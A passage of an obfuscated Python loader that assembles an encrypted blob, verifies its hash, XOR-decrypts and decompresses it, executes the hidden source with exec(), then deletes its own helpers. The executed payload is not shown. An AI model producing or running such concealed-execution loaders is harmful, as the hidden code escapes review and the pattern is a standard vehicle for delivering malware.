_ci7B23MwVQE6uN + _ciXcYxrHo4aqrp + _cihumGR3sipWpZ + _cfC72eIIV87Ekj + _c_uBfoiHuxvi9d + _cwSnOwaNI_Shy9 + _cyDRQw8QqS9BkQ + _cvWhtApR0pruwc + _cxuIyppLMldrqP + _ccEE8F1QELS6Fa + _chS61yKb3YGI0I + _cpUyyItHXCJTUs + _czwh1MotxQhS6o + _cw6S1SFK3pR1_h + _cc7Vje8J1Hz2kO + _cwNcfdem77nzso + _cxWkOOhtsWFvhd + _caOg_ZUEgmDbJU + _cw5tHOiN3SKUOv + _cgQESquyqW3Xj0 + _csPIO8Z9rtnb3A + _ccpc2SXhS9rYsw + _cmhjDh3LANf2nC + _chjdvMALcl4rjE + _cxGTZaEoxGZySt + _cycFsuKBfJdg07 + _cq5QEVr0WcUzq_ + _ctYg0SbXfa4JrR + _cjzXYUDAIfL2vv + _cz7HqYrqyRlPCK + _caioeoEq4A_Mp7 + _cpeKuGyA_r6Vw6 + _cpbVgdXfPklxcs + _cly5Vod3dALkpG + _cmY597v3KmSs71 + _cyjYw4tXr7gQ3N + _cz7rspMQWvXOrd + _ctrO4iOniZ5xPV + _cgUkAkHTaL_ILe + _cmcJthnPsKxhWO + _ccftaTIzhv55ih + _cwGtNWqEo2wyT4 + _cx7odH7uXvRGE9 + _curVfxPvRKCeHK + _csDaqAP2GFzACT + _cgCJnIZX8P8ng1 + _cbxAMVp0RJjKc_ + _cnie4jbBCuQcwe + _cyEKxU7DQiXSz4 + _cz1hOTiYa4MQlT + _cfnfk0li08KVeM + _ceXTUJgFGYgd0H + _cpjqy5glhSwtXE + _cjuvAZJJ4m74hF + _co1MRan7omslWF)
if __import__('hashlib').sha256(_pyox138t3jmAVm).hexdigest() != '33a7b31cd154adfc286b5b6381e1a970957fd569bd300a7d4dfb74085c205896':
    __import__('sys').exit(1)
_xs_6HYbGQ2zkU_ = bytes([242, 223, 5, 225, 165, 141, 162, 197, 249, 4, 133, 142, 93, 40, 161, 227, 236, 112, 133, 150, 107, 121, 66, 151, 190, 77, 159, 47, 31, 219, 149])
_fktZ6ULOzu2JxB7 = bytes([152, 36, 144, 55, 19, 4, 226, 89, 28, 221, 253, 141, 146, 26, 240, 158, 8, 17, 204, 96, 64, 188, 205, 221, 153, 6, 16, 164, 156, 106, 195])

def _fxxBjsF5DbYB4ZB(_boqFJr_ClJT_5Q, _kdrYJa_CCZ9Au4):
    return bytes(_boqFJr_ClJT_5Q[_izt5IFUoGwLyQ2] ^ _kdrYJa_CCZ9Au4[_izt5IFUoGwLyQ2 % len(_kdrYJa_CCZ9Au4)] for _izt5IFUoGwLyQ2 in range(len(_boqFJr_ClJT_5Q)))

def _fdlQkLjYhDhhxrn(_tqDKNAOCA7Z4q_):
    import zlib
    return zlib.decompress(_tqDKNAOCA7Z4q_) # Un seul niveau de zlib ici pour simplifier

def _fewz23IKAe797oi():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xceboGuctc57v5 = _fxxBjsF5DbYB4ZB(_pyox138t3jmAVm, _xs_6HYbGQ2zkU_)
    # 2. Décompression Zlib
    _dtZqatTBCrq8FF = _fdlQkLjYhDhhxrn(_xceboGuctc57v5)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dtZqatTBCrq8FF.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nsCtX9jUkIfFzF = _main.__dict__
    _nsCtX9jUkIfFzF.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nsCtX9jUkIfFzF)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fewz23IKAe797oi()
try:
    del _fxxBjsF5DbYB4ZB, _fdlQkLjYhDhhxrn, _fewz23IKAe797oi
    del _pyox138t3jmAVm, _xs_6HYbGQ2zkU_, _fktZ6ULOzu2JxB7
except:
    pass
